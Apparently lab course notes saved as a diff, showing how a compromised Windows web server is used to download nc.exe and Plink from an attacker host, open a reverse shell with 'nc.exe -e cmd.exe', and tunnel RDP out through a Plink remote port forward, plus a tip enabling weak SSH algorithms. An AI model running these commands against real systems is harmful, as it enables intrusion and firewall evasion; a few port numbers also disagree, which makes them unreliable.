@@ -1,1 +1,150 @@
+Plink
+Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not guaranteed to discover an OpenSSH client. 
+Even if we find ourselves on a recent version of Windows, the network administrators may have removed it.
 
+Nevertheless, network administrators still need remote administration tools. Most networks have SSH servers running somewhere, and administrators need tools to connect to these servers from Windows hosts. 
+Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were PuTTY and its command-line-only counterpart, Plink.
+
+One of the benefits of using tools that are popular with network administrators is that they will rarely be flagged by traditional antivirus software. 
+This makes them appealing to attackers, since using them is relatively covert compared to more security-adjacent tools with similar functionality.
+
+We'll use Plink in this section, since in a security assessment, we will more likely have a shell than GUI access. 
+
+Plink does not have remote dynamic port forwarding
+The Plink manual explains that much of the functionality the OpenSSH client offers is also built into Plink (although one notable feature Plink doesn't have is remote dynamic port forwarding).
+Many 3rd-party SSH clients for Windows provide port forwarding features. We're using Plink in this case because it's common, lightweight, and specifically designed to run on the command line.
+
+Let's get familiar with Plink by using it in the lab in a revised scenario. 
+In this scenario, we find that MULTISERVER03 now has a web application on TCP port 80 exposed. 
+All other inbound ports are blocked by a firewall, so RDP is no longer available either. 
+The layout is much like the following diagram:
+
+behind a firewall, with only port 80 exposed
+
+We can compromise SERVER03 through the web application, drop a web shell on it, and gain a reverse shell using that. 
+We have previously found credentials we could use to connect to the RDP service. 
+This is blocked by the firewall, so we can't connect directly. 
+The OpenSSH client has also been removed, so we can't create a remote port forward using that.
+
+However, we have another option: we can create a remote port forward using Plink.
+
+Let's try this out. 
+First, we will get an interactive reverse shell from SERVER03. 
+We can browse to this URL and run whatever Windows commands we want - these will be run as the iis apppool\defaultapppool user. 
+We can use this web shell to download nc.exe to SERVER03, which we will then use to send a reverse shell back to our Kali machine.
+
+To download nc.exe onto SERVER03, we first need to host it on a server that SERVER03 can access. 
+We can easily configure Apache2 on our Kali machine to do this. 
+Apache2 is installed by default on Kali, so we just need to start the apache2 service.
+
+kali@kali:~$ sudo systemctl start apache2
+Starting Apache2
+
+We can then find nc.exe from our Kali windows-resources/binaries directory and copy it to the Apache2 web root.
+
+kali@kali:~$ find / -name nc.exe 2>/dev/null
+/usr/share/windows-resources/binaries/nc.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+    Copying nc.exe to the Apache2 webroot.
+
+Once the executable's there, we should be able to download it to MULTISERVER03. 
+We will use a PowerShell wget one-liner from our web shell to download nc.exe.
+
+From the web shell, we'll run a command that will instruct PowerShell to download nc.exe from our Kali machine web server (-Uri http://192.168.118.x/nc.exe) and write it to C:\Windows\Temp on SERVER03 with -OutFile. 
+Put together, we run the following:
+
+powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+ The PowerShell command we use to download nc.exe to SERVER03 through the web shell.
+
+Once the PowerShell command is executed, our payload is downloaded from our Apache2 server to C:\Windows\Temp\nc.exe on SERVER03.
+
+We can then set up a Netcat listener on port 4446 on our Kali machine.
+
+kali@kali:~$ nc -nvlp 4446
+Once the listener is running, we'll execute nc.exe on SERVER03 using the web shell again, passing -e to execute cmd.exe once the connection is established.
+
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.x 4446
+    The nc.exe reverse shell payload we execute in the web shell.
+
+The shell quickly hits our listener.
+We now want to download Plink to SERVER03. 
+On our Kali machine, we can copy plink.exe from windows-resources/binaries to the Apache2 web root.
+
+kali@kali:~$ find / -name plink.exe 2>/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+
+
+
+In our reverse shell, we'll again use the PowerShell one-liner to download plink.exe from our Kali machine to C:\Windows\Temp.
+
+c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.x.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+powershell wget -Uri http://192.168.x.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+Plink downloaded to the C:\Windows\Temp folder.
+With the Plink executable downloaded to SERVER03, we can now consider using it.
+
+In this case, let's set up Plink with a remote port forward so that we can access the SERVER03 RDP port from our Kali machine. The command syntax to set up a remote port forward with Plink is very similar to the OpenSSH client remote port forward command. After the -R option, we'll pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.
+We will also pass the username (-l) and password (-pw) directly on the command line.
+This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.
+
+c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+We are presented with a prompt asking if we want to store the server key in the cache.
+
+Limited shell hack, serve in the parameter responses
+In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. 
+An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. 
+This will emulate the confirmation that we usually type when prompted. 
+
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
+
+The entire command would be: cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.
+
+We can confirm that the port has opened on our Kali machine using ss.
+
+kali@kali:~$ ss -ntplu
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+tcp   LISTEN 0      128        127.0.0.1:9833      0.0.0.0:*
+tcp   LISTEN 0      5            0.0.0.0:80        0.0.0.0:*     users:(("python3",pid=1048255,fd=3)) 
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
+tcp   LISTEN 0      128             [::]:22           [::]:*
+kali@kali:~$ 
+    Port 9983 opened on the Kali loopback interface.
+
+Now we can connect to port 9983 on our Kali loopback interface with xfreerdp as the rdp_admin user. 
+To specify a custom RDP port in xfreerdp, we simply append :9833 to the IP address.
+
+kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833  
+
+In this section, we used Plink to create a remote port forward to access the RDP service on MULTISERVER03. 
+We also considered some theoretical problems when initiating Plink in more restrictive shells, and explored piping keystrokes into Plink as a solution.
+
+
+**
+SSH Server compatability issues resolved in /etc/ssh/sshd_configure
+I finally made it worked. For those who may stumble upon the same problem.
+Once you tried to connect with plink, type (on your kali machine ofc)
+
+systemctl status ssh
+
+
+Then watch the last line and it will tell you what algrotithms offers the windows machine, you have to put it in your /etc/sshd_config (and not ssh_config, this is the server conf we need to modify)
+Their offer: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,rsa2048-sha256,rsa1024-sha1 [preauth]
+
+So you do this once for KexAlgorithms, and you may have a problem for HostKeyAlgorithms.
+
+Anyway, here is the 2 lines that made my ssh server work properly with the ssh connection form the windows machine :
+
+you have to put it in your /etc/sshd_config
+
+
+KexAlgorithms diffie-hellman-group1-sha1
+HostKeyAlgorithms ssh-rsa
+
+
+
+And don't forget to restart ssh service 
+
+sudo systemctl restart ssh
